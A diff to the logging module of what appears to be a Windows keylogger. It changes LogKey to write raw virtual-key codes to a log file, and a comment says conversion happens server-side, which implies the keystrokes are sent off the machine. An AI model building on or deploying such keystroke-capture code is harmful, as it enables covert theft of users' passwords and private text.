@@ -1,7 +1,6 @@
 #include <Windows.h>
 #include <stdio.h>
 #include "logger.h"
-#include "ascii_converter.h"
 #include "../Common/constants.h"
 
 // Global variables for logger
@@ -75,38 +74,15 @@ void CleanupLogger() {
 }
 
 // Log a key event
-// Handles both printable characters and special keys
+// Writes raw VK code for server-side conversion
 void LogKey(int vkCode) {
     if (!g_loggerInitialized || g_logFile == NULL) {
         return;
     }
 
-    // Skip modifier keys (Shift, Ctrl, Alt, Win)
-    if (!ShouldLogKey(vkCode)) {
-        return;
-    }
-
     EnterCriticalSection(&g_csLogFile);
 
-    // Check for special key first
-    const char* specialKeyName = GetSpecialKeyName(vkCode);
-    if (specialKeyName != NULL) {
-        fprintf(g_logFile, "%s", specialKeyName);
-    } else {
-        // Try to convert to ASCII
-        bool shift = IsShiftPressed();
-        bool caps = IsCapsLockOn();
-        char ch = VKToAscii(vkCode, shift, caps);
-
-        if (ch != 0) {
-            fprintf(g_logFile, "%c", ch);
-        } else {
-            // Unknown key - log the VK code
-            fprintf(g_logFile, "[VK:0x%02X]", vkCode);
-        }
-    }
-
-    // Flush immediately to ensure data is written
+    fprintf(g_logFile, "VK=0x%02X\n", vkCode);
     fflush(g_logFile);
 
     LeaveCriticalSection(&g_csLogFile);
